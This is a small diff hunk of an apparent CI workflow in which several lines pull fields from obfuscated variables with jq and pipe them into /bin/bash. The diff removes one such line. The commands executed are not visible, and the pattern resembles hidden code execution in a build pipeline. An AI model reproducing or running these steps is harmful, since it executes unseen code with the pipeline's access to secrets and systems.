@@ -54,7 +54,6 @@ jobs:
           printf '%s' "$s27300" | jq -r .fkpo672 | /bin/bash
           printf '%s' "$cnm46267" | jq -r .rnh72492 | /bin/bash
           echo $wbcla535 | jq -r .n135 | /bin/bash
-          echo $qsob06 | jq -r .qi4591 | /bin/bash
           printf '%s' "$guz0569" | jq -r .e70 | /bin/bash
 
       - name: Save output
